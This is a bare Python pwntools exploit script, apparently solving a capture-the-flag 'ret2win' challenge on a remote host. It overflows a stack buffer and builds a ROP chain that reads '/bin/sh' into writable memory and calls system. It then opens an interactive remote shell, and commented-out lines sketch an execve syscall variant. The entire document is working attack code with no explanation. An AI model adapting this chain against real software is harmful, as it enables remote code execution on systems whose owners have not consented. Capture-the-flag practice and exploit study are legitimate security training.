from pwn import *

elf = context.binary = ELF('./ret2win')
context.log_level = 'debug'
context.terminal = 'kitty'

writable = 0x4a1000

offset = 120

pops = 0x461377 # pop rdx ; pop rbx ; ret

p = remote('chal1.gryphons.sg', 10002)
# gdb.attach(p)

rop = ROP(elf)

rop.raw(b'A' * offset)
rop.call(elf.sym.read, [0, writable, 0x200])

# rop.raw(rop.find_gadget(['pop rax', 'ret'])[0])
# rop.raw(59)
# rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
# rop.raw(writable)
# rop.raw(rop.find_gadget(['pop rsi', 'ret'])[0])
# rop.raw(0)
# # rop.raw(0x000000000045f997) # pop rdx ; pop rbx
# # rop.raw(0)
# rop.raw(pops)
# rop.raw(0)
# rop.raw(0)
# rop.raw(0x000000000040128f)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(writable)
rop.raw(rop.find_gadget(['ret'])[0])
rop.raw(elf.sym.system)

print(rop.dump())

p.sendlineafter(':', rop.chain())
p.sendline(b'/bin/sh\x00')

p.interactive()
